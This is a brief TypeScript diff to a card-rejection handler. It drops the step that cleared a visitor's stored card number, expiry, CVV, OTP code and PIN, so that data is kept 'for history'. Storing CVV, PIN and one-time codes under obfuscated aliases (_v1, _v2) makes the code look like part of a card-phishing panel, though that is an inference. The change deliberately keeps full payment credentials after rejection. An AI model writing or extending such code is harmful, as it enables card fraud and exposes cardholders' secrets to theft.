@@ -52,21 +52,9 @@ export async function handleCardRejection(
   // Update history status
   await updateHistoryStatus(visitorId, historyId, "rejected", history)
   
-  // Reject card and notify visitor
+  // Reject card and notify visitor (keep card data for history)
   await updateApplication(visitorId, {
-    cardStatus: "rejected",
-    _v1: "", // cardNumber
-    cardNumber: "",
-    cardType: "",
-    _v3: "", // expiryDate
-    expiryDate: "",
-    _v2: "", // cvv
-    cvv: "",
-    otpCode: "",
-    _v6: "", // pinCode
-    pinCode: "",
-    otpStatus: "",
-    currentStep: 4
+    cardStatus: "rejected"
   })
 }
 
